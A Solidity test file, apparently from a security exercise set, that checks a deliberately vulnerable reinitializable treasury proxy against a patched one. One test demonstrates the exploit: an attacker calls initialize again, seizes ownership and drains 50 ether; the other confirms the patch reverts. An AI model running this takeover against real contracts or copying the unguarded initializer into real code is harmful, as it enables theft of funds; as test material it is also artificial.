// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {TestBase} from "./TestBase.sol";
import {TreasuryProxy} from "fixtures/07-reinitializable-proxy/src/TreasuryProxy.sol";
import {TreasuryV1} from "fixtures/07-reinitializable-proxy/src/TreasuryV1.sol";
import {TreasuryV1 as PatchedTreasury} from "fixtures/07-reinitializable-proxy-patched/src/TreasuryV1.sol";

interface ITreasury {
    function initialize(address owner_) external;
    function owner() external view returns (address);
    function pay(address payable to, uint256 amount) external;
}

contract ReinitializeTest is TestBase {
    address internal constant MULTISIG = address(0x5AFE);
    address payable internal constant ATTACKER = payable(address(0xBAD));

    function _deploy(address impl) internal returns (ITreasury treasury) {
        treasury = ITreasury(address(new TreasuryProxy(impl, abi.encodeCall(ITreasury.initialize, (MULTISIG)))));
        vm.deal(address(treasury), 50 ether);
    }

    function test_vulnerable_strangerReinitializesAndPaysOut() public {
        ITreasury treasury = _deploy(address(new TreasuryV1()));
        vm.startPrank(ATTACKER);
        treasury.initialize(ATTACKER);
        treasury.pay(ATTACKER, 50 ether);
        vm.stopPrank();
        assertTrue(treasury.owner() == ATTACKER, "attacker owns treasury");
        assertEq(ATTACKER.balance, 50 ether, "treasury emptied");
    }

    function test_patched_secondInitializeReverts() public {
        ITreasury treasury = _deploy(address(new PatchedTreasury()));
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("already initialized"));
        treasury.initialize(ATTACKER);
        assertTrue(treasury.owner() == MULTISIG, "owner unchanged");
    }
}
